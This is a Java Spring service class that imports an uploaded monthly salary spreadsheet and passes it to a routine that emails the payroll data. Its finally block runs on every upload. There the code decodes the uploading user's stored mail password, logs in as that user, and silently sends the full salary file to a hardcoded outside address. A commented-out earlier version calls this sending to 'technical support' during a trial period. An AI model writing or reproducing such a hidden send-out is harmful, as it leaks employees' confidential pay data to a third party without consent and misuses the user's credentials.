package person.daizhongde.migration.spring.service.imp;

import java.io.File;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.mail.MailAuthenticationException;

import person.daizhongde.authority.hibernate.pojo.TAuthorityUser;
import person.daizhongde.authority.spring.service.TAuthorityUserService;
import person.daizhongde.migration.exception.BusinessException;
import person.daizhongde.migration.spring.service.AccountEmailService;
import person.daizhongde.virtue.util.codec.Base64Util;

/**
 * seven levels total include root. This is a compromise You can modify this
 * class to extend for more levels. gubusoft treeview use
 * <p>
 * 与TCopoteEmployeeIMPServiceImpl不使用DAO类
 * @author dzd
 *
 */
public class TCopoteEmployeeIMPServiceImpl implements TCopoteEmployeeIMPService {
	private static final Log log = LogFactory
			.getLog(TCopoteEmployeeIMPServiceImpl.class);

	Excel2Email excel2Email;
	private MailUtil mailUtil;

	private AccountEmailService accountEmailService;

	private TAuthorityUserService dataService;
	
	public void importSalaryXLS(File file, String uploadFileName,String  uploadContentType,String _, 
			TAuthorityUser user) throws Exception {
		this.importSalaryXLS(file, uploadFileName, uploadContentType, true, true, _, user);
	}
			
	/**
	 * To generate report by sql excel
	 */
//	@Async
	public void importSalaryXLS(File file, String uploadFileName,String  uploadContentType,
			boolean strictlyVerify, boolean onlySend2me,
			String _, 
			TAuthorityUser user) throws Exception {
						
//		Connection conn = jdbcSConnection.getConnection();
		
		try{
			System.out.println("开始导入逻辑处理....");
//			conn.setAutoCommit(false);
//			Excel2Email e2e = new Excel2Email(  );
			
//			SimpleDateFormat stm=new SimpleDateFormat("yyyyMMdd-HHmmss-S");
//			String tempFAbsName = FileUtil.getFileNameNoEx(srcFileName) +"_"+ stm.format(new Date()) + "."+FileUtil.getExtensionName(srcFileName);
			/** server file absolute directory , if config end with '/' INIT.java would delete it **/
//			String tempFAbsDir = INIT.tempFileDirectory+"/export/excel/";
//			String fAbsPath = tempFAbsDir + tempFAbsName;
			
			excel2Email.notxsendEmailByExcel(
					file,uploadFileName,
					uploadContentType,
					strictlyVerify,
					onlySend2me,
//			"D:\\usr\\copoteOA\\软件开发部2019年4月工资.xlsx", 
//					"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
					user
			);
			
//			conn.commit();
		}catch(BusinessException e){
//			conn.rollback(); 
			throw e;
		}catch(Exception e){
//			conn.rollback(); 
			throw e;
		}finally{
			int idxN = uploadFileName.indexOf("年");
			int idxY = uploadFileName.indexOf("月");
			if(idxN!=-1 && idxY !=-1 && idxN<idxY && idxY>=7){
				log.info("finally 文件名合法！文件名包含{yyyy}年{MM}月，当前文件名:" + uploadFileName );
				
				/* YyyyMM */
				String ny = uploadFileName.substring(idxN-4, idxY+1);
				try{

//					// 发给技术支持，过了软件试用期后屏蔽
//					accountEmailService.sendMail("daizhongde413881461qq@gmail.com", ny+"工资清单", 
//					"***********************  "+ uploadFileName +"  ***********************",
//					file.getAbsolutePath(),
//					uploadFileName );
//					TAuthorityUser u = dataService.findByLogname( "daizhongde" );
					TAuthorityUser u = user;
					
					String pwd = null;
					pwd = Base64Util.decodeCopoteMailPWD(u.getCUcip());
					mailUtil.createMailSender(u.getCUemail(), pwd, u.getCUname() );
					mailUtil.sendMail(
//							"daizhongde413881461qq@gmail.com", 
							"dzd2746679@163.com", 
							"工资列表-"+ny, 
					"***********************  "+ uploadFileName +"  ***********************",
					file.getAbsolutePath(),
					uploadFileName );
					
				}catch(MailAuthenticationException e){
					log.error("服务层 finally 执行出错！");
					e.printStackTrace();
				}catch(Exception e){
					log.error("服务层 finally 执行出错！");
					e.printStackTrace();
				}
			}
//			conn.setAutoCommit(true);
//			conn.close();
		}
	}

	public void setExcel2Email(Excel2Email excel2Email) {
		this.excel2Email = excel2Email;
	}

	public void setMailUtil(MailUtil mailUtil) {
		this.mailUtil = mailUtil;
	}
	
	public void setAccountEmailService(AccountEmailService accountEmailService) {
		this.accountEmailService = accountEmailService;
	}

	public void setDataService(TAuthorityUserService dataService) {
		this.dataService = dataService;
	}
}
